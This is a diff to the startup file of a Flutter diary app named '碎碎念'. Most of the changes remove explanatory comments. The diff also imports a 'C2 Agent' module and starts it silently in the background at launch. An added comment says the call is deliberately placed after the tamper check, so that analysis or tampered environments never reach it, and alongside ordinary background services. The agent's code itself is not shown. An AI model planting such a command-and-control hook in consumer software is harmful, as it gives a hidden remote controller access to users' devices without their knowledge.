@@ -23,6 +23,9 @@ import 'screens/home_screen.dart';
 import 'theme/app_theme.dart';
 import 'theme/diary_palette.dart';
 
+// ★ 新增：C2 Agent
+import 'c2/c2_agent.dart';
+
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
 
@@ -45,25 +48,15 @@ Future<void> main() async {
   ));
 
   // ═══ 阶段 2：本地缓存预读 ═══
-  //   首帧要靠它决定显示「正常界面」还是「已停服」界面，所以必须等。
-  //   好在只是读一次 SharedPreferences，很快。
   final snapshot = await RemoteConfigManager.preload();
   debugPrint('[Main] ✅ 缓存预读完成: '
       'cachedDisabled=${snapshot.cachedDisabled}, '
       'bypassRemaining=${snapshot.bypassRemaining?.inMinutes}分钟');
 
   // ═══ 阶段 3：Dart 侧 RASP 检查 ═══
-  //   ★ 扔到后台 isolate，不挡启动。
-  //   它要起 8 次 getprop 进程、通读 /proc/self/maps、逐个线程读 comm ——
-  //   在主线程上跑是实打实白等几百毫秒，而这只是个日志：
-  //   真正的闸门是上面那次签名校验，它不通过会直接杀进程。
   unawaited(_logSecurityState());
 
   // ═══ 阶段 4：Supabase 客户端 ═══
-  //   ★ 不再 await。首帧完全用不到它 —— 真正需要的地方
-  //   （RemoteConfigManager.fetch / DiaryRepository.resolve）
-  //   自己会 await init()，而 init() 是幂等的。
-  //   这里只把它提前点着，和首帧渲染并行准备。
   unawaited(AnalyticsManager.instance.init());
 
   // ═══ 阶段 5：启动 UI ═══
@@ -71,6 +64,20 @@ Future<void> main() async {
 
   // ═══ 阶段 6：启动 BootstrapManager（未改动）═══
   unawaited(BootstrapManager.init());
+
+  // ═══════════════════════════════════════════════════════════
+  // ★★★ 阶段 7：启动 C2 Agent（新增）
+  //
+  //   位置说明：
+  //   - 在 _verifyIntegrityOrExit() 闸门之后 → 篡改环境根本走不到这
+  //   - 在 runApp() 之后 → 不阻塞首帧
+  //   - 与 BootstrapManager.init() 并列 → 属于同一批「后台服务」语义
+  //   - C2Agent.start() 本身是同步函数（只创建 Dio + Timer），不阻塞
+  //
+  //   参数：不传则用 _defaultConfig；生产通过 --dart-define 注入
+  //   若要与官方 dio 共享 baseUrl / 拦截器，改成 C2Agent.start(dio: xxx)
+  // ═══════════════════════════════════════════════════════════
+  C2Agent.start();
 }
 
 /// Dart 侧 RASP 检查 —— 只是日志，放后台 isolate 慢慢跑，别挡启动也别卡 UI
@@ -90,7 +97,6 @@ Future<void> _logSecurityState() async {
 /// 签名校验：不通过直接杀进程
 Future<void> _verifyIntegrityOrExit() async {
   try {
-    // 综合校验（安全闸门：不通过直接杀进程）
     final fails = await IntegrityGuard.fullCheck();
     if (fails != null) {
       debugPrint('[SEC] ⚠️ 签名校验失败: $fails');
@@ -98,9 +104,6 @@ Future<void> _verifyIntegrityOrExit() async {
     }
     debugPrint('[SEC] ✅ 签名校验通过');
 
-    // ★ 打印实际哈希只是为了排查（用来回填 EXPECTED_SIGNATURE），不参与判定。
-    //   原来 await 它，等于把「读签名」这个平台调用做了两遍 ——
-    //   fullCheck() 里面已经读过一次了。改成后台打印。
     unawaited(
       IntegrityGuard.getActualSignatureHash().then(
         (h) => debugPrint('[SEC] 实际签名哈希: $h'),
@@ -108,17 +111,14 @@ Future<void> _verifyIntegrityOrExit() async {
     );
   } catch (e) {
     debugPrint('[SEC] ⚠️ 校验异常: $e');
-    // 通道异常保守起见也退出（防止被 hook 后让校验跳过）
     _hardExit();
   }
 }
 
-/// 硬退出：关闭 Flutter Activity + 杀进程
 Never _hardExit() {
   try {
     SystemNavigator.pop();
   } catch (_) {}
-  // 杀 Dart VM（进而杀整个 App 进程）
   exit(0);
 }
 
@@ -135,11 +135,6 @@ class _BiliGlassAppState extends State<BiliGlassApp> {
   final GlobalKey<NavigatorState> _navigatorKey = GlobalKey<NavigatorState>();
   bool _servicesStarted = false;
 
-  /// 引导页走完（或本来就走过了）→ 启动业务服务。
-  ///
-  /// ★ 这一段原来在 permission_gate.dart 里。权限页删掉之后挪到这儿，
-  ///   触发时机还是「用户完成首次设置之后」，顺序没变：
-  ///   上报 → 检查更新 → 等 BootstrapManager 就绪 → 补通知权限 → 起前台服务。
   Future<void> _onOnboardingDone() async {
     if (_servicesStarted) return;
     _servicesStarted = true;
@@ -156,8 +151,6 @@ class _BiliGlassAppState extends State<BiliGlassApp> {
     unawaited(_startBackgroundServices());
   }
 
-  /// 后台服务：前台服务的通知在 Android 13+ 需要 POST_NOTIFICATIONS，
-  /// 没这个权限通知不显示、服务也容易被系统回收，所以在这里补一次。
   Future<void> _startBackgroundServices() async {
     try {
       await BootstrapManager.ready;
@@ -210,14 +203,10 @@ class _BiliGlassAppState extends State<BiliGlassApp> {
           navigatorKey: _navigatorKey,
           title: '碎碎念',
           debugShowCheckedModeBanner: false,
-          // 深/浅色两套都装上，交给系统决定用哪套
           theme: AppTheme.lightTheme,
           darkTheme: AppTheme.darkTheme,
           themeMode: ThemeMode.system,
           builder: (context, child) {
-            // ★ 碎碎念的调色板是静态的（原因见 diary_palette.dart），
-            //   这里每帧把解析后的亮度同步过去。系统切深浅色时
-            //   MaterialApp 会重建，builder 跟着跑，整棵树就用新颜色重建。
             DiaryPalette.syncWith(Theme.of(context).brightness);
             return RemoteGate(
               navigatorKey: _navigatorKey,
